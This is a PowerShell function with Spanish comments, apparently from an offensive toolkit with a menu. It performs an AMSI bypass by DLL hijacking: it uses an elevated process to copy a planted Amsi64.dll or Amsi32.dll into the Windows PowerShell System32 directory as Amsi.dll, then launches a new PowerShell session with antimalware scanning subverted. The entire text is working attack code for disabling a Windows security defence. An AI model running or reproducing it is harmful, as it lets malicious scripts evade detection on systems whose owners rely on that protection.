
function DLL_Hijacking

{

    Write-Host "";
    Write-Host "PoC original de https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/";
    Write-Host "";
    Write-Host -ForegroundColor Yellow "Haciendo DLL_Hijacking...";

    #Path de ejecución del script
    $path_execution = Get-Location
    
    #path donde está PowerShell   
    $path_PS = "C:\Windows\System32\WindowsPowerShell\v1.0"

    #Saber si el sistema es de 32 o 64 bits
    
    if([Environment]::Is64BitProcess)
    {

        Start-Process PowerShell.exe -ArgumentList "-command Copy-Item -Force -Recurse '$path_execution\Amsi64.dll' '$path_PS' ; Rename-Item -Force '$path_PS\Amsi64.dll' '$path_PS\Amsi.dll'" -Verb runAs -Wait

    }
    else
    {

        Start-Process PowerShell.exe -ArgumentList "-command Copy-Item -Force -Recurse '$path_execution\Amsi32.dll' '$path_PS' ; Rename-Item -Force '$path_PS\Amsi32.dll' '$path_PS\Amsi.dll'" -Verb runAs -Wait

    }


    Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
    #Lanzar nueva instancia de powershell con el bypass hecho
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
    Show_menu

}